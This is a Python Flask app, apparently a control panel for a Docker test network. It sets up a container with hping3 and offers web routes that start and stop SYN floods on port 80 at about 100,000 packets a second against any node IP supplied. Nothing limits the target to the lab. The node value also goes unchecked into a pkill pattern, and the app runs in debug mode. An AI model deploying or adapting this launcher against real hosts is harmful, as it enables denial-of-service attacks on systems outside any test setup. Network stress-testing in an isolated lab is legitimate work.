from flask import Flask, render_template, request, jsonify
import subprocess
import threading

app = Flask(__name__)

container_id = None
active_attacks = {}

# === Utility Functions ===
def ensure_container():
    if not container_id:
        raise Exception("Container is not set up yet!")

def validate_node(node):
    if not node:
        raise Exception("No node specified!")

# === Routes ===

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/setup-container", methods=["POST"])
def setup_container():
    global container_id
    try:
        run_container_command = [
            "docker", "run", "--rm", "-dit", "--network", "docker_my_network", "debian", "bash"
        ]
        container_id = subprocess.check_output(run_container_command, text=True).strip()

        subprocess.run(["docker", "exec", container_id, "apt-get", "update"], check=True)
        subprocess.run(["docker", "exec", container_id, "apt-get", "install", "-y", "hping3", "procps", "sudo"], check=True)

        return jsonify({"status": "success", "message": "Container setup complete and hping3 installed."})
    except subprocess.CalledProcessError as e:
        return jsonify({"status": "error", "message": f"Setup failed: {e.stderr}"}), 500

@app.route("/run-hping3", methods=["POST"])
def run_hping3():
    global container_id, active_attacks
    try:
        ensure_container()
        node = request.json.get("node")
        validate_node(node)

        # Run hping3 in background using threading
        def inject_traffic(node_ip):
            hping3_command = [
                "docker", "exec", container_id, "hping3", "-S", "-p", "80", "-i", "u10", node_ip
            ]
            active_attacks[node_ip] = subprocess.Popen(hping3_command)

        threading.Thread(target=inject_traffic, args=(node,)).start()
        return jsonify({"status": "success", "message": f"Injecting traffic on {node}."})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 400

@app.route("/stop-hping3", methods=["POST"])
def stop_hping3():
    global container_id, active_attacks
    try:
        ensure_container()
        node = request.json.get("node")
        validate_node(node)

        # Use pkill to stop any matching hping3 process
        pkill_command = [
            "docker", "exec", container_id, "pkill", "-f", f"hping3.*{node}"
        ]
        subprocess.run(pkill_command, check=True)
        
        # Clean up our local tracking (optional)
        if node in active_attacks:
            active_attacks.pop(node)

        return jsonify({"status": "success", "message": f"hping3 attack stopped on {node}."})
    except subprocess.CalledProcessError as e:
        return jsonify({"status": "error", "message": f"Failed to stop: {e.stderr}"}), 500
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 400

@app.route("/status", methods=["GET"])
def status():
    return jsonify({
        "container_id": container_id,
        "active_attacks": list(active_attacks.keys())
    })

if __name__ == "__main__":
    app.run(debug=True)
